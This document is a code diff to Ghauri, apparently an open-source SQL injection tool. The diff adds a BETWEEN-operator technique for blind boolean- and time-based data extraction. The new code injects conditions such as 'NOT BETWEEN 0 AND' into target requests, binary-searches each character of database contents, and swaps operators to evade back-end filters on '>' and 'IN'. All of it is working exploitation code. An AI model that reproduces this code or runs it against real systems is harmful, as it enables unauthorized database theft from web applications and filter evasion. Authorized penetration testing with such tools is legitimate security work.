@@ -98,11 +98,19 @@ class GhauriExtractor:
     ):
         GuessUsing = collections.namedtuple(
             "GuessUsing",
-            ["ok", "binary_search", "in_based_search", "linear_search", "msg"],
+            [
+                "ok",
+                "binary_search",
+                "in_based_search",
+                "linear_search",
+                "between_based_search",
+                "msg",
+            ],
         )
         binary_search = False
         in_based_search = False
         linear_search = False
+        between_based_search = False
         retry_on_error = 0
         http_firewall_code_counter = 0
         timesec = conf.timesec
@@ -112,6 +120,7 @@ class GhauriExtractor:
             binary_search=binary_search,
             in_based_search=in_based_search,
             linear_search=linear_search,
+            between_based_search=between_based_search,
             msg=None,
         )
         expressions = [
@@ -120,6 +129,12 @@ class GhauriExtractor:
                     "[SLEEPTIME]", f"{timesec}"
                 ),
                 "type": "binary_search",
+            },
+            {
+                "expression": vector.replace(
+                    "[INFERENCE]", "6590 NOT BETWEEN 0 AND 6420"
+                ).replace("[SLEEPTIME]", f"{timesec}"),
+                "type": "between_based_search",
             },
             {
                 "expression": vector.replace(
@@ -135,11 +150,64 @@ class GhauriExtractor:
             },
         ]
         start = 0
+        operators = {
+            "greater": "binary_search",
+            "between": "between_based_search",
+            "in": "in_based_search",
+            "equal": "linear_search",
+        }
+        operator = None
+        if conf.fetch_using and conf.fetch_using in list(operators.keys()):
+            operator = operators.get(conf.fetch_using, None)
+            if operator:
+                logger.debug(
+                    f"Ghauri will based data retrieval using '{conf.fetch_using}' openator"
+                )
+                # if conf.fetch_using == "in":
+                #     _temp = GuessUsing(
+                #         ok=True,
+                #         binary_search=binary_search,
+                #         in_based_search=True,
+                #         linear_search=linear_search,
+                #         between_based_search=between_based_search,
+                #         msg="",
+                #     )
+                # if conf.fetch_using == "binary":
+                #     _temp = GuessUsing(
+                #         ok=True,
+                #         binary_search=True,
+                #         in_based_search=in_based_search,
+                #         linear_search=linear_search,
+                #         between_based_search=between_based_search,
+                #         msg="",
+                #     )
+                # if conf.fetch_using == "between":
+                #     _temp = GuessUsing(
+                #         ok=True,
+                #         binary_search=binary_search,
+                #         in_based_search=in_based_search,
+                #         linear_search=linear_search,
+                #         between_based_search=True,
+                #         msg="",
+                #     )
+                # if conf.fetch_using == "equal":
+                #     _temp = GuessUsing(
+                #         ok=True,
+                #         binary_search=binary_search,
+                #         in_based_search=in_based_search,
+                #         linear_search=True,
+                #         between_based_search=between_based_search,
+                #         msg="",
+                #     )
+                # return _temp
         end = len(expressions)
         while start < end:
             entry = expressions[start]
             expression = entry.get("expression")
             _type = entry.get("type")
+            if operator and _type != operator:
+                start += 1
+                continue
             logger.payload(f"{expression}")
             # if http_firewall_code_counter > 2:
             #     message = f"{error_msg} - {http_firewall_code_counter} time(s)"
@@ -155,19 +223,20 @@ class GhauriExtractor:
             #         exit(0)
             #     if choice == "c":
             #         http_firewall_code_counter = 0
-            # if retry_on_error >= retry:
-            #     logger.warning(f"Ghauri detected connection errors multiple times")
-            #     choice = logger.read_input(
-            #         f"how do you want to proceed? [(C)continue/(q)uit] ",
-            #         batch=False,
-            #         user_input="C",
-            #     )
-            #     if choice == "q":
-            #         logger.error("user quit")
-            #         logger.end("ending")
-            #         exit(0)
-            #     if choice == "c":
-            #         retry_on_error = 0
+            if retry_on_error >= conf.retry:
+                start += 1
+                # logger.warning(f"Ghauri detected connection errors multiple times")
+                # choice = logger.read_input(
+                #     f"how do you want to proceed? [(C)continue/(q)uit] ",
+                #     batch=False,
+                #     user_input="C",
+                # )
+                # if choice == "q":
+                #     logger.error("user quit")
+                #     logger.end("ending")
+                #     exit(0)
+                # if choice == "c":
+                #     retry_on_error = 0
             if delay > 0:
                 time.sleep(delay)
             try:
@@ -210,23 +279,48 @@ class GhauriExtractor:
                                 binary_search=True,
                                 in_based_search=in_based_search,
                                 linear_search=linear_search,
+                                between_based_search=between_based_search,
                                 msg="",
                             )
+                        if _type == "between_based_search":
+                            msg = "it appears that the character '>' is filtered by the back-end server. ghauri will based data retrieval on BETWEEN operator"
+                            if conf.fetch_using:
+                                msg = ""
+                            _temp = GuessUsing(
+                                ok=True,
+                                binary_search=binary_search,
+                                in_based_search=in_based_search,
+                                linear_search=linear_search,
+                                between_based_search=True,
+                                msg=msg,
+                            )
                         if _type == "in_based_search":
+                            msg = (
+                                "it appears that the character '>' and 'BETWEEN' operator is filtered by the back-end server. ghauri will based data retrieval on IN() operator",
+                            )
+                            if conf.fetch_using:
+                                msg = ""
                             _temp = GuessUsing(
                                 ok=True,
                                 binary_search=binary_search,
                                 in_based_search=True,
                                 linear_search=linear_search,
-                                msg="it appears that the character '>' is filtered by the back-end server. ghauri will based data retrieval on IN() function",
+                                between_based_search=between_based_search,
+                                msg=msg,
                             )
                         if _type == "linear_search":
+                            msg = (
+                                "it appears that the character '>' and the operator(s) 'IN, BETWEEN' are filtered by the back-end server. ghauri will based data retrieval on '=' operator, You are advised to use --delay=3 in this case",
+                            )
+                            if conf.fetch_using:
+                                msg = ""
                             _temp = GuessUsing(
                                 ok=True,
                                 binary_search=binary_search,
                                 in_based_search=in_based_search,
                                 linear_search=True,
-                                msg="it appears that the character '>' and function 'IN' both are filtered by the back-end server. ghauri will based data retrieval on '=' operator, You are advised to use --delay=3 in this case",
+                                between_based_search=between_based_search,
+                                msg=msg,
                             )
                         break
                 if vector_type == "time_vector":
@@ -238,23 +332,48 @@ class GhauriExtractor:
                                 binary_search=True,
                                 in_based_search=in_based_search,
                                 linear_search=linear_search,
-                                msg=None,
+                                between_based_search=between_based_search,
+                                msg="",
+                            )
+                        if _type == "between_based_search":
+                            msg = "it appears that the character '>' is filtered by the back-end server. ghauri will based data retrieval on BETWEEN operator"
+                            if conf.fetch_using:
+                                msg = ""
+                            _temp = GuessUsing(
+                                ok=True,
+                                binary_search=binary_search,
+                                in_based_search=in_based_search,
+                                linear_search=linear_search,
+                                between_based_search=True,
+                                msg=msg,
                             )
                         if _type == "in_based_search":
+                            msg = (
+                                "it appears that the character '>' and 'BETWEEN' operator is filtered by the back-end server. ghauri will based data retrieval on IN() operator",
+                            )
+                            if conf.fetch_using:
+                                msg = ""
                             _temp = GuessUsing(
                                 ok=True,
                                 binary_search=binary_search,
                                 in_based_search=True,
                                 linear_search=linear_search,
-                                msg="it appears that the character '>' is filtered by the back-end server. ghauri will based data retrieval on IN() function",
+                                between_based_search=between_based_search,
+                                msg=msg,
                             )
                         if _type == "linear_search":
+                            msg = (
+                                "it appears that the character '>' and the operator(s) 'IN, BETWEEN' are filtered by the back-end server. ghauri will based data retrieval on '=' operator, You are advised to use --delay=3 in this case",
+                            )
+                            if conf.fetch_using:
+                                msg = ""
                             _temp = GuessUsing(
                                 ok=True,
                                 binary_search=binary_search,
                                 in_based_search=in_based_search,
                                 linear_search=True,
-                                msg="it appears that the character '>' and function 'IN' both are filtered by the back-end server. ghauri will based data retrieval on '=' operator, You are advised to use --delay=3 in this case",
+                                between_based_search=between_based_search,
+                                msg=msg,
                             )
                         break
                 start += 1
@@ -674,6 +793,193 @@ class GhauriExtractor:
                         f"error {error}, during detection phase. Ghauri is going to retry"
                     )
                     retry_on_error += 1
+        return character
+
+    def _search_using_between_operator(
+        self,
+        url,
+        data,
+        vector,
+        parameter,
+        headers,
+        base,
+        injection_type,
+        delay=0,
+        timesec=5,
+        timeout=30,
+        proxy=None,
+        attack01=None,
+        code=None,
+        match_string=None,
+        not_match_string=None,
+        text_only=False,
+        is_multipart=False,
+        suppress_output=False,
+        query_check=False,
+        minimum=None,
+        maximum=None,
+        offset=0,
+        expression_payload=None,
+        queryable=None,
+        chars="",
+        vector_type=None,
+        retry=3,
+        *args,
+        **kwargs,
+    ):
+        # need to implement retry mechanism in case of http connection related errors..
+        if not minimum:
+            minimum = 32
+        if not maximum:
+            maximum = 127
+        ascii_char = 0
+        is_found = False
+        character = ""
+        http_firewall_code_counter = 0
+        error_msg = None
+        retry_on_error = 0
+        if not conf.threads:
+            logger.progress(f"retrieved: {chars}")
+        if conf.threads:
+            chars = "".join(
+                [
+                    str(i)
+                    for i in collections.OrderedDict(
+                        sorted(conf._thread_chars_query.items())
+                    ).values()
+                ]
+            )
+            logger.progress(f"retrieved: {chars}")
+        sleep_time = conf.timesec
+        while not is_found:
+            if conf._readtimout_counter >= 3:
+                if conf.rto_warning:
+                    if not conf.rtom_warning:
+                        choice = logger.read_input(
+                            "Ghauri detected read timeout multiple time(s). Do you want to continue? [y/N] "
+                        )
+                        if choice == "n":
+                            logger.end("ending")
+                            exit(0)
+                        conf.rtom_warning = True
+                if not conf.rto_warning:
+                    msgrto = ""
+                    if vector_type == "time_vector":
+                        msgrto = ", It is recommended to set high value of option(s) '--time-sec', increase delay between request(s) with an option '--delay'"
+                    if vector_type == "boolean_vector":
+                        msgrto = ", It is recommended to set high value of option(s) '--timeout' and also increase delay between each http request with an option '--delay'"
+                    logger.warning(
+                        f"Ghauri detected read timout '{conf._readtimout_counter}' time(s){msgrto}."
+                    )
+                    conf.rto_warning = True
+                    conf._readtimout_counter = 0
+            if delay > 0:
+                time.sleep(delay)
+            ascii_char = int((minimum + maximum) / 2)
+            if (minimum == ascii_char) & (maximum == ascii_char):
+                is_found = True
+                character = str(chr(ascii_char))
+                if not conf.threads:
+                    logger.progress(f"retrieved: {chars}{character}")
+                if conf.threads:
+                    conf._thread_chars_query.update({offset: character})
+                    chars = "".join(
+                        [
+                            str(i)
+                            for i in collections.OrderedDict(
+                                conf._thread_chars_query.items()
+                            ).values()
+                        ]
+                    )
+                    logger.progress(f"retrieved: {chars}")
+                break
+            condition = expression_payload.format(
+                query=queryable, position=offset, char=ascii_char
+            )
+            condition = replace_with(
+                string=condition, character="=", replace_with=" NOT BETWEEN 0 AND "
+            )
+            expression = vector.replace("[INFERENCE]", f"{condition}").replace(
+                "[SLEEPTIME]", f"{sleep_time}"
+            )
+            logger.payload(f"{expression}")
+            try:
+                attack = inject_expression(
+                    url=url,
+                    data=data,
+                    proxy=proxy,
+                    delay=delay,
+                    timesec=timesec,
+                    timeout=timeout,
+                    headers=headers,
+                    parameter=parameter,
+                    expression=expression,
+                    is_multipart=is_multipart,
+                    injection_type=injection_type,
+                )
+                response_time = attack.response_time
+                logger.debug(
+                    f"sleep time: {sleep_time}, response time: {response_time}"
+                )
+                if attack01 and vector_type == "boolean_vector":
+                    bool_retval = check_boolean_responses(
+                        base,
+                        attack,
+                        attack01,
+                        code=code,
+                        match_string=match_string,
+                        not_match_string=not_match_string,
+                        text_only=text_only,
+                    )
+                    result = bool_retval.vulnerable
+                    if result:
+                        minimum = ascii_char + 1
+                        maximum = maximum
+                    else:
+                        minimum = minimum
+                        maximum = ascii_char
+                if vector_type == "time_vector":
+                    if response_time >= sleep_time:
+                        minimum = ascii_char + 1
+                        maximum = maximum
+                    else:
+                        minimum = minimum
+                        maximum = ascii_char
+            except KeyboardInterrupt as error:
+                if conf.threads:
+                    raise error
+                logger.warning("user aborted during data extraction phase")
+                quest = logger.read_input(
+                    "how do you want to proceed? [(C)continue/(e)nd this phase/(q)uit] ",
+                    batch=False,
+                    user_input="C",
+                )
+                if quest and quest == "e":
+                    raise error
+                if quest and quest == "q":
+                    logger.error("user quit")
+                    logger.end("ending")
+                    exit(0)
+            except ConnectionAbortedError as e:
+                logger.critical(
+                    f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
+                )
+                retry_on_error += 1
+            except ConnectionRefusedError as e:
+                logger.critical(
+                    f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
+                )
+                retry_on_error += 1
+            except ConnectionResetError as e:
+                logger.critical(
+                    f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
+                )
+                retry_on_error += 1
+            except Exception as error:
+                logger.critical(
+                    f"error {error}, during detection phase. Ghauri is going to retry"
+                )
+                retry_on_error += 1
         return character
 
     def _binary_search(
@@ -1690,6 +1996,7 @@ class GhauriExtractor:
         binary_search = False
         in_based_search = False
         linear_search = False
+        between_based_search = False
         is_resumed = False
         start_pos = 1
         start_chars = ""
@@ -1787,6 +2094,7 @@ class GhauriExtractor:
                 binary_search = retval_check.binary_search
                 in_based_search = retval_check.in_based_search
                 linear_search = retval_check.linear_search
+                between_based_search = retval_check.between_based_search
             if not retval_check.ok:
                 logger.critical(
                     "ghauri will not be able to extract data as '=', 'IN' and '>' all are filtered by back-end server.."
@@ -1801,7 +2109,12 @@ class GhauriExtractor:
                         chars = start_chars
                         pos = start_pos
                         total_length = length + 1
-                        if conf.threads and not binary_search and not in_based_search:
+                        if (
+                            conf.threads
+                            and not binary_search
+                            and not in_based_search
+                            and not between_based_search
+                        ):
                             logger.debug(
                                 "Ghauri will use a fallback leaner search to guess character(s), adjusting threads to 1"
                             )
@@ -1841,8 +2154,10 @@ class GhauriExtractor:
                                     exfiltration_func = self._binary_search
                                 if in_based_search:
                                     exfiltration_func = self._search_using_in_operator
-                                # if linear_search:
-                                #     exfiltration_func = self._linear_search
+                                if between_based_search:
+                                    exfiltration_func = (
+                                        self._search_using_between_operator
+                                    )
                                 exec_map = {
                                     ex.submit(
                                         exfiltration_func,
@@ -1990,6 +2305,74 @@ class GhauriExtractor:
                                                     )
                                                     bool_invalid_character_counter += 1
                                                     binary_search = False
+                                                    between_based_search = True
+                                                    in_based_search = False
+                                                    linear_search = False
+                                                if is_valid:
+                                                    pos += 1
+                                                    chars += retval
+                                        elif between_based_search:
+                                            retval = (
+                                                self._search_using_between_operator(
+                                                    url=url,
+                                                    data=data,
+                                                    vector=vector,
+                                                    parameter=parameter,
+                                                    headers=headers,
+                                                    base=base,
+                                                    injection_type=injection_type,
+                                                    delay=delay,
+                                                    timesec=timesec,
+                                                    timeout=timeout,
+                                                    proxy=proxy,
+                                                    attack01=attack01,
+                                                    code=code,
+                                                    match_string=match_string,
+                                                    not_match_string=not_match_string,
+                                                    is_multipart=is_multipart,
+                                                    suppress_output=suppress_output,
+                                                    query_check=query_check,
+                                                    minimum=32,
+                                                    maximum=127,
+                                                    offset=pos,
+                                                    expression_payload=value,
+                                                    queryable=entry,
+                                                    chars=chars,
+                                                    text_only=text_only,
+                                                    vector_type=vector_type,
+                                                )
+                                            )
+                                            if retval:
+                                                is_valid = self.validate_character(
+                                                    url=url,
+                                                    data=data,
+                                                    vector=vector,
+                                                    parameter=parameter,
+                                                    headers=headers,
+                                                    base=base,
+                                                    injection_type=injection_type,
+                                                    proxy=proxy,
+                                                    is_multipart=is_multipart,
+                                                    timeout=timeout,
+                                                    delay=delay,
+                                                    timesec=timesec,
+                                                    identified_character=retval,
+                                                    vector_type=vector_type,
+                                                    offset=pos,
+                                                    expression_payload=value,
+                                                    queryable=entry,
+                                                    code=code,
+                                                    match_string=match_string,
+                                                    not_match_string=not_match_string,
+                                                    attack01=attack01,
+                                                )
+                                                if not is_valid:
+                                                    logger.warning(
+                                                        "invalid character detected, retrying."
+                                                    )
+                                                    bool_invalid_character_counter += 1
+                                                    binary_search = False
+                                                    between_based_search = False
                                                     in_based_search = True
                                                     linear_search = False
                                                 if is_valid:
